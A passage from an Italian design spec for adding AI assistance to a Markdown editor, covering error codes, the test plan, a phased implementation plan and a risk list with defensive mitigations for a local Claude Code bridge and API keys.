    componenti: `{ resetKey, textLf, selection, history }`, dove `history` è il valore di `historyField` di
    `@codemirror/commands` (immutabile, legato al testo).
  - Ogni editor del documento (l'`Editor` normale, l'editor `a` della `MergeView`, l'editor sinistro della vista
    affiancata) si costruisce con `docStateConfig(session)` = `{ doc, selection, extensions: [docExtensions(...),
    historyField.init(() => session.history)] }`. `StateField.init` sostituisce solo il valore iniziale del campo:
    è compatibile con la config di `MergeView` (che aggiunge le sue estensioni sopra) e con `EditorState.create`.
  - Allo smontaggio, o prima di passare a un'altra vista, l'editor salva nel `DocSession` testo, selezione e
    `history` correnti. Il `DocSession` si azzera solo quando cambia `resetKey` (altro file, ricarica dal disco):
    lì la cronologia va persa come oggi.
  - `useDocBinding` non chiama mai `setState` sull'editor `a` di una `MergeView` (perderebbe le estensioni interne
    del merge): un cambio di `resetKey` in modalità AI ricrea la `MergeView` intera da un `DocSession` nuovo; il
    comando `restore` della cronologia è già una transazione (v1.1) e si applica uguale.
  - Verifica anticipata all'inizio della fase 4 (è un modulo puro, `EditorState` gira in Node senza DOM): stato con
    modifiche → salvataggio nel `DocSession` → stato ricostruito con `historyField.init` → `undo` riporta il testo
    di partenza, e lo stesso passando per la config di `MergeView`. Se non regge, la fase si ferma e si torna alla
    spec prima di scrivere la vista.
  - Test del ciclo completo: accetta in Diff → passa ad Affiancata → torna a File → `Ctrl+Z` annulla
    l'accettazione; ricarica dal disco azzera la cronologia; selezione conservata.
- **Nessun cambiamento alla coda `runExclusive`:** l'AI non esegue operazioni sui file del workspace.
  `snapshotBeforeAi()` segue la regola esistente (cattura sincrona, scrittura fire-and-forget).
- `SettingsDialog` cresce: la sezione AI entra come componenti separati sotto `ui/ai/settings/`, il dialog li
  monta soltanto (a schede se diventa troppo lungo).
- **Dipendenze nuove:** `@codemirror/merge`, `@anthropic-ai/sdk` (chunk separato). Nessuna dipendenza per il bridge.

## 10. Gestione degli errori

`AiErrorCode` (unione chiusa, tradotta con `t('ai.error.' + code)`, dettaglio tecnico come `{detail}`):
`unreachable` (rete/CORS/server spento/permesso rete locale negato, con le istruzioni per il provider),
`bridgeDown` (bridge Claude Code non raggiungibile: "avvia `npm run bridge`"), `bridgeIncompatible` (all'URL risponde un programma che non è il bridge di HouseMD o una versione senza le protezioni richieste), `secretBinding` (la chiave è legata a un altro endpoint: va confermata), `scopeLost` (la selezione è cambiata), `bridgeCli` (la CLI ha fallito: non
trovata, non autenticata, uscita non zero; col messaggio del bridge), `originRejected` (403 dal bridge: origine non
in `ALLOWED_ORIGINS`), `unauthorized`, `forbidden`, `notFound` (modello o endpoint), `noModel` (LM Studio senza
modello scelto), `rateLimited` (con `retry-after` se presente), `paramRejected`, `tooLong`, `refused`, `truncated`,
`timeout`, `server` (5xx), `badStream`, `aborted` (non è un errore visivo: messaggio "interrotta").

Sync: `syncInvalid`, `syncPermission`, `syncBackupFailed`, `syncWriteFailed`, `syncLocked`, `syncStale` (solo informativo).

Aggiornamento: `aiPendingUpdate` (toast, §4.3).

- Nessun retry automatico sulle trasformazioni (costano); pulsante "Riprova" sul messaggio. Nelle parti, un errore
  ferma la sequenza con la proposta `partial` e "Continua".
- Le chiavi non compaiono mai in errori, toast o console: `errors.ts` ripulisce i dettagli da `Authorization`/
  `x-api-key` e da stringhe che assomigliano a chiavi.
- Errori di IndexedDB degli store AI: toast; la chat continua (è in memoria comunque).
- Errori della sync non bloccano mai l'uso dell'AI.

## 11. Test

Tutto con `tsx --test`, nessuna chiamata di rete reale e nessuna cartella reale:
- `sse`: righe spezzate tra chunk, `[DONE]`, keep-alive, errore JSON a metà.
- Adattatori con `fetch`/SDK finti: `openaiCompatible` (tre configurazioni, normalizzazione URL, elenchi Ollama e LM
  Studio con ripiego 404), `claudeCode` (risposta intera, errori JSON del bridge, 403, `/health` incompatibile → nessun documento inviato), `anthropic` (eventi, stop
  per lunghezza, rifiuto); mappatura errori (401, 404, 429 con retry-after, 400 con parametro, rete); abort a metà.
- `models`: `knownModel`, cambio provider che tiene o resetta il modello, modello personalizzato visibile.
- `capabilities`/`profiles`: filtro dei parametri, `effectiveParams`, `isLocalProfile`, profili corrotti.
- `resolveSecret`: chiave usata solo con `kind` e origine uguali al `binding`; `baseUrl` cambiato a mano o dalla
  sync → nessuna richiesta autenticata parte (anche elenco modelli e "Prova connessione") finché l'utente non conferma.
- `presets`: seme identico in ogni lingua (`name: ''`, `updatedAt: 0`), ripristino originale, variabili, predefinito
  non eliminabile.
- `safeRender`: §7.6.
- `scope`: §5.5.
- `docSession`: §9 (cronologia che sopravvive a Editor → MergeView → Editor, azzerata da `resetKey`).
- `prompt`: storico senza documenti, indicazione del file per messaggi riferiti ad altri file, `tooLong`.
- `proposalStream`, `chunking`, `checks`, `align`: come nella prima bozza (tag spezzati carattere per carattere,
  `join(split(x)) === x`, proposta parziale, ogni avviso positivo e negativo, accoppiamenti e ripiego).
- `runner`/`aiController` con provider finto lento: cambio file durante la richiesta (la proposta resta al file di
  partenza, la chat continua), correlazione `docPath`, "Nuova chat", stop, "Continua", override e "Salva nel
  profilo", `snapshotBeforeAi` una volta per proposta, accettazione rifiutata in conflitto/aggiornamento,
  "Accetta tutto" con documento cambiato, accettazione disabilitata durante lo streaming e riattivata dopo Stop,
  streaming che non sovrascrive una proposta ritoccata, `hasPendingWork` e `beforeunload`; partecipanti
  dell'aggiornamento PWA: `prepare` fallisce con proposta pendente o richiesta in corso, `cancel` chiamato su chi
  aveva già preparato, nessuna richiesta avviabile durante `updating`.
- Store: memoria + IndexedDB (fake-indexeddb), timbri, tombstone prima della cancellazione, migrazione v2 → v3 con
  cronologia e buffer intatti.
- Sync: `stamp` (monotono rispetto alla versione di partenza, anche "dal futuro"); `merge` (commutativa,
  idempotente, associativa, con timbri e autori uguali e payload diversi, semi, tombstone, potatura fuori dal
  merge); `schema` (file non valido intatto, `secretId` mai scritto); `lock` (acquisizione, lock scaduto, token
  altrui non rilasciato, timeout); `syncFile` su `memoryOps` (backup prima e mai sovrascritto, backup fallito = file
  intatto, `.part` univoco + verifica, ripiego senza `moveFile` e con `moveFile` che rifiuta); `syncCycle` (file
  assente, invariato → nessuna scrittura, cambiato durante il giro → rifusione, modifica locale durante il giro non
  sovrascritta, due cicli intrecciati §8.4); `restore` (§8.5).
- Bridge: `node:test` con finto `claude` (§6.5).
- i18n: chiavi nuove in tutte le lingue (`locales.test.ts` esistente).

Collaudo manuale in Chrome (fase 9): Ollama con CORS e senza (messaggio giusto), LM Studio, bridge Claude Code
(avviato, spento, origine non ammessa, bridge tg-digest puntato per errore → rifiutato; nessuna sessione in
`~/.claude` dopo l'uso), un profilo Anthropic; i tre preset su documenti reali; accettazione per
blocco e totale, `Ctrl+Z`, cronologia con `before-ai`; chat che attraversa due file; sync tra due profili Chrome
sulla stessa cartella (modifica, eliminazione, conflitto, permesso da riattivare, ripristino di un backup); una
risposta con immagine remota (nessuna richiesta di rete nei DevTools); aggiornamento PWA con proposta pendente
(bloccato con il toast, anche dall'altra scheda); PWA offline con Ollama.

## 12. Piano incrementale

Ogni fase finisce con `npm test`, `npm run lint`, `npm run build` puliti e qualcosa di usabile. Il piano di
implementazione dettagliato (writing-plans) si scrive dopo l'approvazione di questa spec.

**Fase 0 — Prerequisiti e verifiche.** v1.1 unita a `main`, branch `feat/ai-tool` da lì. Verifiche manuali (usa e
getta, nessun codice tenuto), dall'origine di sviluppo e da quella pubblicata: CORS e permesso di rete locale con
Ollama, LM Studio e bridge; CORS dei servizi `openai-compatible` cloud; con la CLI `claude` installata,
l'invocazione di §6.5 (nessuno strumento disponibile, nessun file di sessione creato in `~/.claude`,
autenticazione dell'abbonamento funzionante) e il comportamento di `-p` con storico su stdin. Esiti annotati in questa spec (§6.4, §6.5).

**Fase 1 — Nucleo dei provider (solo logica).** `types`, `sse`, `errors`, `profiles`, `models`, `capabilities`,
`resolveSecret`, `providers/*` (con il controllo di `/health` del bridge) con test su fetch/SDK finti. Nessuna UI.

**Fase 2 — Bridge Claude Code.** `bridge/claude-bridge.mjs` con le differenze di §6.5, script `npm run bridge`,
test `node:test`, sezione README.

**Fase 3 — Impostazioni AI, sidebar e chat libera.** DB v3 con timbri e tombstone; seme dei preset (solo dati);
sezione Impostazioni → Profili con `ModelSelect` e "Prova connessione"; switch File/AI con scorciatoia e larghezza
propria; `ModelSelector` con popover e override; chat generica correlata al file, solo testo, resa con
`safeRender`. Regole nuove in
`CLAUDE.md`. *Usabile:* si parla col documento aperto tramite Ollama, Anthropic o l'abbonamento Claude Code.

**Fase 4 — Vista di revisione Diff.** Prima la verifica di `DocSession` con `historyField.init` (§9, si ferma se
non regge); poi estrazione `docExtensions`/`useDocBinding`/`DocSession` (l'editor normale resta identico: test
esistenti verdi); `@codemirror/merge`; `ReviewView` + `DiffPane`; proposte per file; protocollo con tag e
`proposalStream`; accetta blocco / accetta tutto / scarta, disabilitati durante lo streaming; `snapshotBeforeAi` e motivo
`before-ai`; stati disabilitati; `hasPendingWork` in `beforeunload` e partecipanti dell'aggiornamento PWA. *Usabile:* "correggi i refusi" in chat → diff → accetta.

**Fase 5 — Preset.** Modalità trasformazione, barra dei preset, sezione Impostazioni → Preset (crea, duplica,
modifica, nascondi, ordina, ripristina originale), frontmatter `keep`, `checks`. *Usabile:* consecutio e preset
dell'utente su testi brevi e medi.

**Fase 6 — Vista affiancata.** `SideBySidePane`, destra Sorgente/Anteprima (con `untrusted`, §7.6), `align` e scroll collegato con
interruttore; vista di default per preset. *Usabile:* traduzione leggibile a fianco.

**Fase 7 — Documenti lunghi.** `chunking`, `runner` a parti, avanzamento, proposta parziale, "Continua", ambito
"Selezione" con rimappatura e verifica (§5.5). *Usabile:* sbobina di trascrizioni lunghe.

**Fase 8 — Sync su file.** `ai/sync/*` (timbri, fusione, lock, scrittura atomica, ripristino), `AiSync`, sezione
Impostazioni → Sincronizzazione (scelta cartella, avviso per cartelle replicate, stato, permesso, "Sincronizza
ora", backup e ripristino). *Usabile:* stessi preset e profili su due computer.

**Fase 9 — Lingue, documentazione, collaudo.** Traduzione delle chiavi nuove nelle altre 7 lingue (subagent
dedicato come in v1.1), README (Ollama, LM Studio, bridge, chiavi, sync), collaudo manuale completo (§11).

## 13. Rischi

- **CORS e rete locale** sono il punto più fragile per l'utente: fase 0, istruzioni per provider nelle impostazioni,
  "Prova connessione", errori specifici (`bridgeDown`, `originRejected`, `unreachable`).
- **Sicurezza del bridge:** un bridge aperto a `*` esporrebbe l'abbonamento e, con gli strumenti attivi, i file
  dell'utente a qualsiasi sito. Mitigato da origini ammesse con controllo dell'header, ascolto su `127.0.0.1`,
  `--tools ""`, `--strict-mcp-config`, `--no-session-persistence`, cartella di lavoro vuota, porta diversa da
  tg-digest e verifica di `/health` prima di inviare documenti (§6.5).
- **Esfiltrazione tramite rendering:** risposte e proposte non caricano risorse remote non presenti
  nell'originale (§7.6).
- **Chiavi verso host non voluti:** chiave legata a provider e origine, confermata a ogni cambio (§5.3). Lo stesso irrobustimento andrebbe riportato in tg-digest.
- **Bridge senza streaming:** attese lunghe senza testo. Mitigato da indicatore con tempo trascorso, elaborazione a
  parti con avanzamento per parte, Stop che termina la CLI; streaming nella lista "dopo".
- **Modelli locali piccoli** che ignorano le istruzioni: modalità trasformazione senza tag, rimozione del recinto,
  controlli di lunghezza, diff sempre visibile prima di accettare.
- **Proposte perse ricaricando** (D2, niente persistenza): avviso `beforeunload` finché c'è una proposta non
  accettata o in arrivo.
- **Sync con servizi cloud di terzi** (copie di conflitto, lock che non vale tra computer, `lastModified`
  inaffidabile): garanzie best effort dichiarate (§8), convergenza condizionata ai database locali intatti, lock e
  temporanei univoci,
  fusione a record intero idempotente con timbri monotoni, rifusione dai database locali, backup a ogni scrittura,
  file non valido mai toccato, ripristino con epoche (`restore`/`localEpoch`) che respingono le repliche obsolete.
- **Doppio editor del documento** (normale e revisione): estensioni e binding in un solo punto, `DocSession` con
  la cronologia che passa da un editor all'altro, verifica anticipata in fase 4; i test esistenti dell'editor
  fanno da rete.
- **Crescita di `WorkspaceView.tsx` e `SettingsDialog.tsx`:** la modalità AI entra come componenti separati
  (`AiSidebar`, `ReviewView`, sezioni sotto `ui/ai/settings/`), senza logica nuova in quei file.
